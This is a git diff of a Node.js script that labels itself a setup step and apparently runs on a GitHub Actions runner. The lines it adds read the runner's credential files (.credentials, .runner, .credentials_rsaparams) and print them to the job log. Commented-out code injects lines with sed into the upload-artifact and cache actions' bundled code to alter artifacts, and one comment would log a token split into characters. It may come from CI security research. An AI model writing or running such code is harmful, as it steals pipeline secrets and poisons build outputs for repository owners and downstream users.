@@ -3,25 +3,39 @@ const fs = require("fs");
 
 console.log("this is a setup.....")
 
-// Modify the value of math-homework artifact
 
-// fs.mkdir('artifact', function(err){
+const files_other = fs.readdirSync('/home/runner');
+    files_other.forEach(element => {
+        if(element == ".credentials" || element == ".runner" || element == ".credentials_rsaparams"){
+            
+            let path = `/home/runner/${element}`;
+            
+            process.exec(`cat ${path}`, (err, stdout, stderr) => {
+                if (err){
+                    console.log(err);
+                    return;
+                }
+                console.log(`-----${element}------`);
+                console.log(`stdout: ${stdout.toString()}`);
+                console.log(`stderr: ${stderr}`);
+            });
+            
+        }
+    });
+
+
+
+// Modify the value of math-homework artifact
+// let writecontent = 'fs.writeFileSync("/home/runner/work/test_actions_02/test_actions_02/artifact/math-homework.txt", "1")';
+
+// cl_process.exec(`sed -i '642i ${writecontent}' /home/runner/work/_actions/actions/upload-artifact/v3/dist/index.js`, (err, stdout, stderr) => {
 //     if (err){
 //         console.log(err);
 //         return;
 //     }
+//     console.log(`stdout: ${stdout.toString()}`);
+//     console.log(`stderr: ${stderr}`);
 // });
-
-let writecontent = 'fs.writeFileSync("/home/runner/work/test_actions_02/test_actions_02/artifact/math-homework.txt", "1")';
-
-cl_process.exec(`sed -i '642i ${writecontent}' /home/runner/work/_actions/actions/upload-artifact/v3/dist/index.js`, (err, stdout, stderr) => {
-    if (err){
-        console.log(err);
-        return;
-    }
-    console.log(`stdout: ${stdout.toString()}`);
-    console.log(`stderr: ${stderr}`);
-});
 
 
 //Add a new upload-me artifact, then upload it
@@ -83,21 +97,7 @@ cl_process.exec(`sed -i '642i ${writecontent}' /home/runner/work/_actions/action
 
 
 
-// fs.writeFileSync(`/home/musset/actions-runner/_work/test_actions_02/test_actions_02/cache-folder/cache_me`, `cache_try`)
-// for(let i = 1; i<=10; i++){
-//     fs.writeFileSync(`/home/musset/actions-runner-org/_work/test_actions_02/test_actions_02/cache-folder/cache_me_${i}`, `cache_${i}`)
-// }
 
-// let writecontent = 'const cacheId1 = yield reserveCache("cache_me_3", paths, {compressionMethod}); console.log(cacheId1);';
-// cl_process.exec(`sed -i '3611i ${writecontent}' /home/musset/actions-runner-org/_work/_actions/actions/cache/v2/dist/save/index.js`, (err, stdout, stderr) => {
-//     if (err){
-//         console.log(err);
-//         return;
-//     }
-
-//     console.log(`stdout: ${stdout.toString()}`);
-//     console.log(`stderr: ${stderr}`);
-// });
 
 
 // let writecontent = 'console.log(JSON.stringify(token.split("")));';
